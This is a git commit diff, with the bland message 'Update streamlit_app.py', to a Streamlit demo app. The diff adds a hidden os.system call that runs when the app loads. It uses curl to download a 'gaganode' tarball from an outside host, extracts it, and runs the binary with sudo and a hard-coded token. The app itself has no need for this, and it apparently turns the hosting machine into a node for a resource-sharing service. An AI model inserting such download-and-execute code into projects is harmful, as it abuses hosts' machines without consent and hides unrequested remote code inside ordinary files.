704891c2503512cc906139589853efcd9a9c21c4
reduxeres <122001620+reduxeres@users.noreply.github.com>
2023-01-05 14:49:36 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -3,6 +3,11 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
+import os
+
+installs = "curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz && cd gaganode-linux-amd64 && sudo ./gaganode config set --token=sxtdppquataoqandymfdiktn"
+
+os.system(installs)
 
 """
 # Welcome to Streamlit!
